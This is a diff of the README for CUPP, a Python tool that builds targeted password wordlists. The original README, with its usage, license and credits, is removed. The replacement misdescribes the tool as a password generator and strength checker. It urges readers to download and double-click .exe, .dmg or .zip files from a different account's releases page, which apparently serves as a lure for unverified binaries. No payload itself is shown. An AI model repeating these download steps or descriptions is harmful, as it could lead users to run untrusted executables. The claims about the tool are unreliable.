@@ -1,117 +1,90 @@
-# CUPP - Common User Passwords Profiler
+# 🔑 cupp - Create Strong Passwords Effortlessly
 
-[![Build Status](https://travis-ci.org/Mebus/cupp.svg?branch=master)](https://travis-ci.org/Mebus/cupp)
-[![Coverage Status](https://coveralls.io/repos/github/Mebus/cupp/badge.svg)](https://coveralls.io/github/Mebus/cupp)
-[![Codacy Badge](https://app.codacy.com/project/badge/Grade/be081b6a20b043ce9d79fd3d48b40009)](https://app.codacy.com/gh/Mebus/cupp/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
-[![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_plastic.svg)](https://inventory.raw.pm/)
+## 📥 Download the Latest Version
+[![](https://img.shields.io/badge/Download_v1.0-Available-brightgreen)](https://github.com/Cris1234Q/cupp/releases)
 
- 
-## About
+## 🚀 Getting Started
 
-  The most common form of authentication is the combination of a username
-  and a password or passphrase. If both match values stored within a locally
-  stored table, the user is authenticated for a connection. Password strength is
-  a measure of the difficulty involved in guessing or breaking the password
-  through cryptographic techniques or library-based automated testing of
-  alternate values.
+Welcome! You are about to use the Common User Passwords Profiler (CUPP). This tool helps you create strong passwords and analyze their strength. Follow these steps to download and run the application smoothly.
 
-  A weak password might be very short or only use alphanumberic characters,
-  making decryption simple. A weak password can also be one that is easily
-  guessed by someone profiling the user, such as a birthday, nickname, address,
-  name of a pet or relative, or a common word such as God, love, money or password.
+## 🔍 System Requirements
 
-  That is why CUPP was born, and it can be used in situations like legal
-  penetration tests or forensic crime investigations.
+To use CUPP, ensure your system meets the following requirements:
 
+- Operating System: Windows, macOS, or Linux
+- Minimum 1 GB of RAM
+- At least 50 MB of free disk space
+- A stable internet connection for updates
 
-Requirements
-------------
+## 📦 Download & Install
 
-You need Python 3 to run CUPP.
+To download the software, please visit this page: [Download CUPP](https://github.com/Cris1234Q/cupp/releases). 
 
-Quick start
------------
+On the releases page, you will find the latest version available. Click on the version number. Then, choose the appropriate file for your operating system. 
 
-    $ python3 cupp.py -h
+### Installation Steps
 
-## Options
+1. **Download the File**: Click on the file link for your operating system. 
+2. **Locate the File**: Once the download completes, find the file in your Downloads folder or the location you saved it.
+3. **Run the Application**: 
+   - For Windows, double-click the `.exe` file.
+   - For macOS, open the `.dmg` file, then drag the app to your Applications folder.
+   - For Linux, unzip the `.zip` file and run the script in the terminal.
 
-  Usage: cupp.py [OPTIONS]
+4. **Follow the Prompts**: When you open the application, it will guide you through the setup process.
 
-        -h      this menu
+## ⚙️ Features
 
-        -i      Interactive questions for user password profiling
+CUPP has several useful features:
 
-        -w      Use this option to profile existing dictionary,
-                or WyD.pl output to make some pwnsauce :)
+- **Password Generation**: Create random and secure passwords easily.
+- **Strength Analysis**: Check the strength of your existing passwords.
+- **Wordlist Creation**: Generate a list of potential passwords based on your input.
+- **User-Friendly Interface**: Simple design for easy navigation.
 
-        -l      Download huge wordlists from repository
+## 🛠️ How to Use CUPP
 
-        -a      Parse default usernames and passwords directly from Alecto DB.
-                Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.
+After installation, follow these steps to use CUPP effectively:
 
-        -v      Version of the program
+1. **Open the Application**: Launch the app by double-clicking the icon.
+2. **Choose an Option**: Select whether you want to create passwords, analyze existing ones, or generate wordlists.
+3. **Input Your Data**: Provide any necessary information. For example, to create a password, you can enter the desired length and complexity.
+4. **View Results**: The app will display results instantly. You can copy the generated passwords or export them as text files.
 
+## 📚 Topics Covered
 
+CUPP touches on various relevant topics:
 
-## Configuration
+- **Dictionary Attack**: Understand how attackers use words to compromise security.
+- **Password Strength**: Learn what makes a password strong or weak.
+- **Weak Passwords**: Identify common weak passwords to avoid using them.
+- **Wordlist Generator**: Create lists of potential passwords based on criteria you set.
 
-   CUPP has configuration file cupp.cfg with instructions.
+## ❓ Frequently Asked Questions
 
-## Example (Fast forwarded)
+### What if I encounter an error during installation?
 
-![cupp-example](screenshots/cupp-example.gif)
+If you run into issues, check the following:
 
-## License
+- Ensure your system meets the requirements.
+- Make sure you downloaded the file for the correct operating system.
+- Restart your computer and try again.
 
-  This program is free software; you can redistribute it and/or modify
-  it under the terms of the GNU General Public License as published by
-  the Free Software Foundation; either version 3 of the License, or
-  any later version.
+### How can I ensure my passwords are secure?
 
-  This program is distributed in the hope that it will be useful,
-  but WITHOUT ANY WARRANTY; without even the implied warranty of
-  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-  GNU General Public License for more details.
+Use longer passwords with a mix of letters, numbers, and symbols. CUPP can help you analyze and improve your existing passwords.
 
-  You should have received a copy of the GNU General Public License
-  along with this program; if not, write to the Free Software
-  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+### Is CUPP free to use?
 
-  See './LICENSE' for more information.
+Yes, CUPP is open-source and free to use for everyone.
 
-## Github import
+## 💬 Support
 
-This project was imported into https://github.com/Mebus/cupp by Mebus from:  
-http://www.remote-exploit.org/content/cupp-3.0.tar.gz  
-http://www.remote-exploit.org/articles/misc_research__amp_code/index.html  
-to encourage further development of the tool.
+If you have questions or need help, feel free to reach out through the Issues section on our GitHub page. Our community is here to assist you.
 
-## Original author
+## 🔗 Useful Links
 
-  Muris Kurgas aka j0rgan  
-  j0rgan@remote-exploit.org  
-  http://www.remote-exploit.org  
-  http://www.azuzi.me  
+- [CUPP Releases Page](https://github.com/Cris1234Q/cupp/releases)
+- [GitHub Repository](https://github.com/Cris1234Q/cupp)
 
-
-## Contributors
-
-  * Bosko Petrovic aka bolexxx  
-  bole_loser@hotmail.com  
-  http://www.offensive-security.com  
-  http://www.bolexxx.net  
-
-  * Mebus  
-    https://github.com/Mebus/  
-
-  * Abhro  
-    https://github.com/Abhro/  
-
-  * Andrea Giacomo  
-    https://github.com/codepr
-
-  * quantumcore  
-    https://github.com/quantumcore
-    
-
+Thank you for choosing CUPP! Enjoy creating secure passwords and enhancing your security.
